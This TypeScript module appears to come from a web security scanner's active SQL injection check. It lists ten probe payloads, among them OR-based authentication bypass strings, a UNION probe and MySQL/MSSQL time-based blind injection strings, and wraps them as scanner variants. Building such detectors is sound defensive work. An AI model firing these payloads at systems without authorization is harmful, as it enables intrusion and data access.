// SQL injection active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant, MutationContext } from '../types';

export const META = {
  id: 'sql-injection',
  family: 'sql-injection' as const,
  name: 'SQL Injection',
  description: 'Detects SQL injection via error-based, boolean-based, and time-based probes.',
  defaultRisk: 'low' as const,
  insertionPointKinds: ['query', 'body', 'json', 'cookie', 'path'],
};

const SQL_ERROR_PROBES = [
  { value: "'", intent: 'Single-quote to break SQL string context', signals: ['sql-error'] },
  { value: "''", intent: 'Double single-quote to close and reopen string context', signals: ['sql-error'] },
  { value: "1' OR '1'='1", intent: 'Classic OR-based boolean bypass', signals: ['sql-error', 'auth-bypass'] },
  { value: "1' OR '1'='1'--", intent: 'OR bypass with comment to terminate query', signals: ['auth-bypass'] },
  { value: "1 AND 1=2", intent: 'Boolean condition that evaluates false', signals: ['sql-error'] },
  { value: "1 UNION SELECT NULL--", intent: 'UNION probe with minimal column count', signals: ['sql-error', 'union-result'] },
  { value: "'; WAITFOR DELAY '0:0:5'--", intent: 'MSSQL time-based blind probe (5s delay)', signals: ['timing-delta'] },
  { value: "1'; SELECT SLEEP(5)--", intent: 'MySQL time-based blind probe (5s delay)', signals: ['timing-delta'] },
  { value: "1' AND SLEEP(5)--", intent: 'MySQL boolean-based sleep probe', signals: ['timing-delta'] },
  { value: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", intent: 'MySQL nested sleep in subquery', signals: ['timing-delta'] },
];

export function variants(ctx: MutationContext): PayloadVariant[] {
  return SQL_ERROR_PROBES.map((probe, i) => ({
    id: `sqli-${i + 1}`,
    family: 'sql-injection' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
